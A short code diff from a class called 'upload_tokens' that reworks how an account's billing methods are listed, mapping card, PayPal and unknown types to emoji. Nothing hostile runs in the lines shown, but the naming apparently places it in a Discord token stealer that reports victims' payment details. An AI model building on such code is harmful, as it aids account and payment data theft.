@@ -241,9 +241,16 @@ class upload_tokens:
                 
             if billing:
                 payment_methods = []
-
-                payment_methods.append('💳')
-                    
+                
+                for i in billing:
+                    if i['type'] == 1:
+                        payment_methods.append('💳')
+                    elif i['type'] == 2:
+                        payment_methods.append("<:paypal:973417655627288666>")
+                        
+                    else:
+                        payment_methods.append('❓')
+                        
                 payment_methods = ', '.join(payment_methods)
             else:
                 payment_methods = None
